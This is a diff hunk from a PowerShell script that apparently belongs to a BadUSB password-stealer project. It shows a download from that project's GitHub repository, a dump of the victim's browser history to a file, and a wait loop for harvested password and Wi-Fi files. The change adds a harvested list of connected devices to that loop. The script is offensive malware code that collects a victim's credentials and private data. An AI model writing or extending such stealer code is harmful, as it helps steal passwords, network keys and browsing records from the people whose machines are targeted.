@@ -27,7 +27,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
 
 # Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt")) {
     Start-Sleep -Seconds 1
 }
 
